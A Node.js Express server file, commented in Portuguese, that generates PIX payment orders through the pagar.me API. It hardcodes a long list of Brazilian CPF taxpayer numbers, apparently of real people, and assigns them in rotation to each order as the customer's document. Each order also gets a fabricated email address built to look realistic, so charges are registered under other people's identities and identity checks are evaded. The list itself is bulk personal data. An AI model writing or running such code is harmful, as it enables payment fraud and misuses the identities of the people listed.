require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');
const crypto = require('crypto');
const fs = require("fs");


// ─── Configuração de CPFs (ORDEM SEQUENCIAL) ──────────────────────────────────
const RAW_CPFS = `
27446738898
45528427819
30928743829
40870236806
28826234884
11884463630
37228680847
34840424861
90034758810
40831769890
42672711860
56111399810
48900522833
33138499899
48338504866
21988301831
39645155827
10045818827
27616015808
44027151801
36336497860
48181736818
58938043843
33362389864
39505147830
53072907803
42938477821
93552963472
23243905826
46980926802
49242760811
50788933850
31515235874
40964306840
45851485825
49200846840
40502313870
57508012844
10714123889
29116115864
56811526858
39547127845
40661621855
16698863874
26381903813
28128248839
31713365880
35647357806
35597650807
52854233840
35773968819
30543676811
32547138859
44054167888
46284437854
44341721828
44319719808
54019921814
34482697869
43979940802
47970412858
52268125823
49705114897
18342001806
13121143831
18559584811
29281451840
32728281840
43186054850
47613392848
19233106748
48006195803
41341318800
50159553830
46795540880
51521572844
56616103862
32400183813
37341007800
40652799841
47850943899
26395392808
15553079810
13287426877
12970322846
12403959812
43513610858
42886105830
41713600803
45543392893
49056155857
44397019819
39547070800
40674272803
54475044812
48593734804
57203412857
40674315898
57780527824
56796660011
56187213840
59624560846
53456489803
61834296358
50100162819
41397043814
26363381878
49013538850
16987627800
55475630801
18549491870
26021851838
36697830832
49086515827
47966258874
33093894808
41253109800
33474853864
46204876864
22502370850
36391625875
36859238895
47980286812
11413677690
41738614867
48379659899
28328634856
46378334854
29803001876
31584922885
32318078831
35855242811
38802049858
34856940880
41934743801
54813742858
16105005806
42966173890
15835388799
48056039848
52915315841
17995095830
38003206812
35689019860
33461321885
38297519821
47164853827
40317574841
27778158876
41308958854
31536155861
45422577892
28587348876
14514924806
28964589807
30815071892
46035405827
50965146847
46515238894
50418961867
54353139886
50067186840
35585249851
97983420625
42665985802
50365804860
40568388879
33594671836
38359128871
29048245885
48153626884
30968265871
47955912888
39373914871
41741185823
59604208802
40763023892
73717940104
38448375823
43606380860
13670641807
39101082884
41648328865
42344228861
43865149880
46616908852
37273605859
13334074838
27187389876
30768121817
40066661870
32804853802
41687395896
38739138879
41537514806
39320215847
32214240861
52723531880
34212053888
40687884902
31182865801
30537351809
41311871837
32246638801
50656445866
54684628850
35731831823
36224735840
49323517801
44729532856
34064199847
15304487869
31053012837
43919131860
45761813866
53497042811
31094522864
50316992801
50172661862
54827745897
57313046880
40597295824
40066723817
28875870802
25348443859
28868396907
44680077883
42128157889
40782592864
37925623837
57639934893
50686629841
15749179869
53633653830
34853851828
37028760812
37646013889
44990865820
30410594873
39066289813
46482647898
52824083840
42831949807
45749382850
58159208863
31674565828
10348872895
41310710880
45037282888
11997502470
12279192470
25170907850
26941345802
48265471882
48050395820
56403921851
25751130839
28367857801
45749347869
13239227805
52942846852
54907738803
`;

const CPF_LIST = RAW_CPFS.trim().split(/[\s,]+/).filter(cpf => cpf.length >= 11);

let currentCpfIndex = 0;

/**
 * Retorna o próximo CPF da lista em ordem sequencial.
 */
function getNextCpf() {
    if (currentCpfIndex >= CPF_LIST.length) {
        currentCpfIndex = 0;
    }
    const selectedCpf = CPF_LIST[currentCpfIndex];
    currentCpfIndex++;
    return selectedCpf || CPF_LIST[0];
}

const app = express();
const PORT = process.env.PORT || 3000;

// ─── Middlewares ───────────────────────────────────────────────────────────────
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

/**
 * Formata o valor monetário (ex: 100 -> "1,00")
 */
function formatCurrency(amountInCents) {
    const value = amountInCents / 100;
    return value.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

/**
 * MOTOR DE GERAÇÃO DE E-MAIL REALISTA
 */
function generateUltraRandomEmail(fullName) {
    const domains = [
        'gmail.com', 'gmail.com', 'gmail.com', 
        'outlook.com', 'hotmail.com', 'hotmail.com', 
        'yahoo.com.br', 'uol.com.br', 'icloud.com'
    ];
    
    const commonSurnames = [
        'sil98a', 'saskl9os', 'olil99a', 'sltoll', 'rodiuac09', 'fereeo09', 'alknns', 
        'perddriox', 'lsjjh', 'gfomen', 'ciooasj', 'eib8uua', 'martaiis', 'caailne', 
        'asjjaba', 'odiiok', 'soassar', 'ffilaj', 'aliie', 'ddlioan'
    ];

    const clean = (str) => str.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/[^a-z]/g, '');
    
    const nameParts = fullName.trim().split(/\s+/);
    const firstName = clean(nameParts[0]) || 'user';
    const firstTwo = firstName.length >= 2 ? firstName.slice(0, 2) : firstName;
    
    const surname = commonSurnames[Math.floor(Math.random() * commonSurnames.length)];
    const sep = ['.', '_', ''][Math.floor(Math.random() * 3)];

    const n1 = () => Math.floor(Math.random() * 10).toString();
    const n2 = () => Math.floor(Math.random() * 90 + 10).toString();
    const n3 = () => Math.floor(Math.random() * 900 + 100).toString();
    const year = () => {
        const y = [
            Math.floor(Math.random() * (2010 - 1970) + 1970),
            Math.floor(Math.random() * (25 - 10) + 10)
        ];
        return y[Math.floor(Math.random() * y.length)].toString();
    };

    const strategies = [
        () => `${firstTwo}${n1()}`,
        () => `${firstTwo}${sep}${surname}${n1()}`,
        () => `${firstTwo}${n2()}`,
        () => `${firstTwo}${sep}${surname}${n2()}`,
        () => `${surname}${sep}${firstTwo}${n1()}`,
        () => `${surname}${sep}${firstTwo}${n2()}`,
        () => `${firstTwo}${sep}${n3()}`,
        () => `${firstTwo}${sep}${n2()}`,
        () => `${firstTwo}${sep}${surname}${sep}${year()}`,
        () => `${firstTwo}.${['sp', 'rj', 'mg', 'ba'][Math.floor(Math.random() * 4)]}${n2()}`,
        () => `${firstTwo}${Math.floor(Math.random() * 90000 + 10000)}`,
        () => `${surname}${sep}${firstTwo}${sep}${year()}`
    ];

    const username = strategies[Math.floor(Math.random() * strategies.length)]();
    const randomDomain = domains[Math.floor(Math.random() * domains.length)];
    return `${username}@${randomDomain}`;
}

// ─── Endpoint: Gerar PIX via pagar.me ─────────────────────────────────────────
app.post('/api/pix', async (req, res) => {
    try {
        const { payer_name, amount, payer_phone } = req.body;

        if (!payer_name || !amount) {
            return res.status(400).json({ success: false, error: 'Campos obrigatórios ausentes.' });
        }

        // Seleciona o próximo CPF na ordem sequencial da lista
        const selectedCpf = getNextCpf();
        
        const refererUrl = req.get('referer') || '';
        let addressFromUrl = '';
        let cepFromUrl = '';
        try {
            const urlObj = new URL(refererUrl);
            addressFromUrl = urlObj.searchParams.get('address') || '';
            cepFromUrl = urlObj.searchParams.get('cep') || '';
        } catch (e) {}

        const dynamicEmail = generateUltraRandomEmail(payer_name);
        const amountInCents = Math.round(parseFloat(amount) * 100);
        
        const phoneClean = payer_phone ? String(payer_phone).replace(/\D/g, '') : '11999999999';
        const areaCode = phoneClean.substring(0, 2) || '11';
        const phoneNumber = phoneClean.substring(2) || '999999999';

        const formattedMetadata = {
            endereco_entrega: `Endereço: ${addressFromUrl || 'Não informado'}, CEP: ${cepFromUrl || 'Não informado'}`,
            valor_compra: formatCurrency(amountInCents),
            dados_cliente: `Nome: ${payer_name.trim().split(' ')[0]}, CPF: ${selectedCpf}`
        };

        const payload = {
            items: [{ amount: amountInCents, description: 'Pedido', quantity: 1, code: 'ITEM-001' }],
            customer: {
                name: payer_name.trim().split(' ')[0],
                type: 'individual',
                document: selectedCpf,
                document_type: 'CPF',
                email: dynamicEmail,
                phones: {
                    mobile_phone: { country_code: '55', area_code: areaCode, number: phoneNumber }
                }
            },
            payments: [{ payment_method: 'pix', pix: { expires_in: 900 } }],
            metadata: formattedMetadata
        };

        const secretKey = process.env.PAGARME_SECRET_KEY;
        const basicAuth = Buffer.from(`${secretKey}:`).toString('base64');

        const response = await fetch('https://api.pagar.me/core/v5/orders', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Authorization': `Basic ${basicAuth}`
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();

        if (!response.ok) {
            return res.status(response.status).json({ success: false, error: data.message });
        }

        const charge = data.charges && data.charges[0];
        const lastTransaction = charge && charge.last_transaction;
        
        // Retorno original preservado para evitar erros no frontend
        return res.json({
            success: true,
            pixCode: lastTransaction && lastTransaction.qr_code,
            qrCodeUrl: lastTransaction && lastTransaction.qr_code_url,
            orderId: data.id,
            sentEmail: dynamicEmail,
            sentCpf: selectedCpf,
            sentAddress: formattedMetadata.endereco_entrega,
            sentCustomerData: formattedMetadata.dados_cliente
        });

    } catch (err) {
        console.error('Erro interno:', err);
        return res.status(500).json({ success: false, error: 'Erro interno' });
    }
});

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
